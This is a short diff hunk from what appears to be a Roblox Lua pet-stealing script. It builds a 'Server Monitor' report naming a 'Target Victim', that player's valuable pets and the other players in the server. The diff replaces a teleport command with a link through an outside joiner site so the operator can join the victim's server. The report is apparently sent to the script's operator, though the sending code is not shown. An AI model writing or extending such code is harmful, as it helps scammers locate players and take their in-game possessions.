@@ -285,14 +285,14 @@ task.spawn(function()
                 playerListString = "No other players in the server."
             end
 
-            local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
+            local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
 
             local embed = {
                 title = "Server Monitor",
                 color = 16776960,
                 fields = {
                     {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
-                    {name = "🔗 Join Command", value = teleport_command, inline = false},
+                    {name = "🔗 Server Link", value = join_link, inline = false},
                     {name = "🐾 Victim's Priority Pets", value = formattedPriorityPetsForMonitor, inline = false},
                     {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
                 },
